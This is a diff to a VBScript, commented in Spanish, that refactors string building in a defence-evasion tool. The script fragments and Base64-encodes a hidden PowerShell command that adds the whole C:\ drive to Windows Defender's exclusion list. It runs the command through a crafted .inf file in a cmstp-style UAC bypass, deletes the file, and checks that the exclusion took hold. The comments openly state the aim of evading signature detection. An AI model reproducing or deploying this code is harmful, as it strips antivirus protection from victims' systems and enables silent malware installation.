@@ -12,7 +12,7 @@
 Option Explicit
 
 Dim ws, fso, tempFolder, infFile, scriptPath, scriptName
-Dim cmstpPath, result, randSuffix
+Dim cmstpPath, result, randSuffix, i
 
 ' Inicializar objetos
 Set ws = CreateObject("WScript.Shell")
@@ -51,27 +51,21 @@ End If
 ' Fragmentar comandos para evitar detección por firma
 
 Dim cmdFragments
-cmdFragments = Array( _
-    "Get-", _
-    "MpPreference", _
-    "Add-", _
-    "ExclusionPath", _
-    "ErrorAction", _
-    "Stop" _
-)
+cmdFragments = Array("Get-", "MpPreference", "Add-", "ExclusionPath", "ErrorAction", "Stop")
 
 ' Construir comando PowerShell completamente ofuscado
 Dim psCmd
-psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command ""& {" & _
-    "$ErrorActionPreference='" & cmdFragments(5) & "';" & _
-    "try{" & _
-        "$null=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & _
-        "& '" & cmdFragments(2) & cmdFragments(1) & "' -" & cmdFragments(3) & " 'C:\' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & _
-        "Start-Sleep -Milliseconds 400;" & _
-        "$excl=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & _
-        "if($excl -contains 'C:\'){exit 0}else{exit 1}" & _
-    "}catch{exit 1}" & _
-    "}"""
+Dim psCmdPart1, psCmdPart2, psCmdPart3, psCmdPart4, psCmdPart5, psCmdPart6, psCmdPart7
+
+psCmdPart1 = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "
+psCmdPart2 = Chr(34) & "& {" & "$ErrorActionPreference='" & cmdFragments(5) & "';"
+psCmdPart3 = "try{" & "$null=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";"
+psCmdPart4 = "& '" & cmdFragments(2) & cmdFragments(1) & "' -" & cmdFragments(3) & " 'C:\' -" & cmdFragments(4) & " " & cmdFragments(5) & ";"
+psCmdPart5 = "Start-Sleep -Milliseconds 400;"
+psCmdPart6 = "$excl=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";"
+psCmdPart7 = "if($excl -contains 'C:\'){exit 0}else{exit 1}" & "}catch{exit 1}" & "}" & Chr(34)
+
+psCmd = psCmdPart1 & psCmdPart2 & psCmdPart3 & psCmdPart4 & psCmdPart5 & psCmdPart6 & psCmdPart7
 
 ' Codificar comando en Base64 Unicode para evasión máxima
 Dim encodedCmd
@@ -80,7 +74,8 @@ encodedCmd = EncodeToBase64Unicode(psCmd)
 ' Función para codificar a Base64 Unicode (formato requerido por PowerShell -EncodedCommand)
 Function EncodeToBase64Unicode(text)
     Dim xmlDoc, xmlNode
-    Dim bytes(), i, charCode
+    Dim bytes()
+    Dim i, charCode
     Dim byte1, byte2
     
     Set xmlDoc = CreateObject("Msxml2.DOMDocument.6.0")
@@ -106,20 +101,19 @@ End Function
 ' ============================================
 
 Dim infContent
-infContent = "[version]" & vbCrLf & _
-    "Signature=$CHICAGO$" & vbCrLf & _
-    "AdvancedINF=2.5" & vbCrLf & _
-    "[DefaultInstall]" & vbCrLf & _
-    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
-    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
-    "[RunPreSetupCommandsSection]" & vbCrLf & _
-    "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedCmd & vbCrLf & _
-    "timeout /t 1 /nobreak >nul 2>&1" & vbCrLf & _
-    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
-    "[CustomDestAllUsers]" & vbCrLf & _
-    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
-    "[AllUSer_LDIDSection]" & vbCrLf & _
-    ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+Dim infPart1, infPart2, infPart3, infPart4, infPart5, infPart6, infPart7, infPart8, infPart9
+
+infPart1 = "[version]" & vbCrLf & "Signature=$CHICAGO$" & vbCrLf & "AdvancedINF=2.5" & vbCrLf
+infPart2 = "[DefaultInstall]" & vbCrLf & "CustomDestination=CustomDestAllUsers" & vbCrLf
+infPart3 = "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf
+infPart4 = "[RunPreSetupCommandsSection]" & vbCrLf
+infPart5 = "cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand " & encodedCmd & vbCrLf
+infPart6 = "timeout /t 1 /nobreak >nul 2>&1" & vbCrLf
+infPart7 = "del /q /f " & Chr(34) & infFile & Chr(34) & " 2>nul" & vbCrLf
+infPart8 = "[CustomDestAllUsers]" & vbCrLf & "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf
+infPart9 = "[AllUSer_LDIDSection]" & vbCrLf & Chr(34) & "HKLM" & Chr(34) & ", " & Chr(34) & "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE" & Chr(34) & ", " & Chr(34) & "ProfileInstallPath" & Chr(34) & ", " & Chr(34) & "%UnexpectedError%" & Chr(34) & ", " & Chr(34) & Chr(34)
+
+infContent = infPart1 & infPart2 & infPart3 & infPart4 & infPart5 & infPart6 & infPart7 & infPart8 & infPart9
 
 ' Escribir archivo .inf
 On Error Resume Next
@@ -161,9 +155,12 @@ WScript.Sleep execDelay
 ' ============================================
 
 Dim verifyCommand
-verifyCommand = "powershell.exe -WindowStyle Hidden -Command """ & _
-    "$x=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & _
-    "if($x -contains 'C:\'){exit 0}else{exit 1}""" & ""
+Dim verifyPart1, verifyPart2, verifyPart3
+verifyPart1 = "powershell.exe -WindowStyle Hidden -Command "
+verifyPart2 = Chr(34) & "$x=& '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";"
+verifyPart3 = "if($x -contains 'C:\'){exit 0}else{exit 1}" & Chr(34)
+
+verifyCommand = verifyPart1 & verifyPart2 & verifyPart3
 
 result = ws.Run(verifyCommand, 0, True)
 
